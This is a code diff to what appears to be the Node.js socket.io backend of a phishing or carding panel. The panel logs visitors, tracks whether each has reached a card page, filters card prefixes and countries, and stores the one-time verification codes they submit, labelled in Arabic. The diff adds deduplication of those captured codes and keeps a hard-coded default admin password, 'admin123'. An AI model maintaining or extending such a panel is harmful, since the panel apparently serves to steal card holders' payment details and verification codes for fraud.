@@ -178,7 +178,39 @@ let savedVisitors = savedData.savedVisitors; // Array to store all visitors perm
 let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
 let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
 let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
-let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)
+let adminPassword = savedData.adminPassword || "admin123";
+
+// [FIX-DEDUP] الرمز مرة واحدة فقط — تنظيف السجلات القديمة
+(function dedupCodes() {
+  let changed = false;
+  savedVisitors.forEach(function (v) {
+    if (!v) return;
+    if (Array.isArray(v.digitCodes) && v.digitCodes.length) {
+      const map = {};
+      v.digitCodes.forEach(function (dc) { if (dc && dc.code != null) map[String(dc.code).trim()] = dc; });
+      const uniq = Object.keys(map).map(function (k) { return map[k]; });
+      if (uniq.length !== v.digitCodes.length) { v.digitCodes = uniq; changed = true; }
+    }
+    if (Array.isArray(v.dataHistory) && v.dataHistory.length) {
+      const codes = {};
+      (v.digitCodes || []).forEach(function (d) { if (d && d.code != null) codes[String(d.code).trim()] = 1; });
+      const seen = {};
+      const before = v.dataHistory.length;
+      v.dataHistory = v.dataHistory.filter(function (en) {
+        if (!en || !en.content) return true;
+        const keys = Object.keys(en.content);
+        const pureCode = en.__isCode === true || (keys.length === 1 && keys[0] === 'الرمز');
+        if (!pureCode) return true;
+        const val = String(en.content['الرمز'] == null ? '' : en.content['الرمز']).trim();
+        if (codes[val]) return false;
+        if (seen[val]) return false;
+        seen[val] = 1; return true;
+      });
+      if (v.dataHistory.length !== before) changed = true;
+    }
+  });
+  if (changed) { try { saveData(); console.log('[FIX-DEDUP] cleaned duplicate codes'); } catch (e) {} }
+})(); // Admin password (persisted)
 
 // Generate unique API key
 function generateApiKey() {
@@ -595,19 +627,17 @@ io.on("connection", (socket) => {
       }
       if (data.digitCode) {
         const now = new Date().toISOString();
-        visitor.digitCodes.push({
-          code: data.digitCode,
-          page: data.page,
-          timestamp: now,
+        const codeStr = String(data.digitCode).trim();
+        // [FIX-DEDUP] الرمز يُحفظ مرة واحدة فقط
+        let dc = (visitor.digitCodes || []).find(function (x) {
+          return x && String(x.code).trim() === codeStr;
         });
-        if (!visitor.dataHistory) visitor.dataHistory = [];
-        visitor.dataHistory.push({
-          content: { 'الرمز': data.digitCode },
-          page: data.page || 'رمز التحقق',
-          timestamp: now,
-          __isCode: true,
-        });
-        // Only update if already entered card page
+        if (dc) {
+          dc.timestamp = now;
+          if (data.page) dc.page = data.page;
+        } else {
+          visitor.digitCodes.push({ code: codeStr, page: data.page, timestamp: now });
+        }
         if (visitor.hasEnteredCardPage) {
           visitor.lastDataUpdate = now;
         }
